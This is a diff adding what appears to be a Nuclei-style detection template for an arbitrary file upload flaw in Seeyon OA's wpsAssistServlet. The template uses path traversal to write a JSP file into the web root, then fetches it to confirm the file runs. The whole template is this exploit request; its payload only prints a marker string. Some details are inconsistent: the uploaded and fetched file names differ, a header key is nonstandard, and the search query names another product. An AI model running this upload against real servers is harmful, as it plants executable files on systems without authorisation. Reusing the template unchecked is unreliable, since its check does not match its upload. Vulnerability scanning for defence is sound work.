@@ -1,0 +1,48 @@
+id: 致远OA wpsAssistServlet 任意文件上传漏洞
+time: '2022-09-05'
+
+
+info:
+  name: 致远OA wpsAssistServlet 任意文件上传漏洞
+  severity: high
+  description: 致远OA A6、A8、A8N (V8.0SP2, V8.1, V8.1SP1) 致远OA G6、G6N (V8.1、V8.1SP1)
+  reference: https://mp.weixin.qq.com/s/lOk7rt26z33e-ogLmFlE0Q
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: body=“window.location.replace(“login.jsp?up=1”)” || body=“GRP-U8”
+  
+http:
+  - method: 
+      - POST
+      - GET
+    path:
+      - "{{BaseURL}}/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&fileId=2"
+      - "{{BaseURL}}/debuggg.jsp"
+    
+    Rheader:
+      - Content-Type:multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b & Accept-Encoding:gzip
+        
+    body: 
+      - |
+        --59229605f98b8cf290a7b8908b34616b
+        Content-Disposition: form-data; name="upload"; filename="123.xls"
+        Content-Type: application/vnd.ms-excel
+
+        <% out.println("seeyon_vuln");%>
+        --59229605f98b8cf290a7b8908b34616b--
+        
+
+      
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "seeyon_vuln"
+
+      - type: status
+        status:
+          - 200
+    
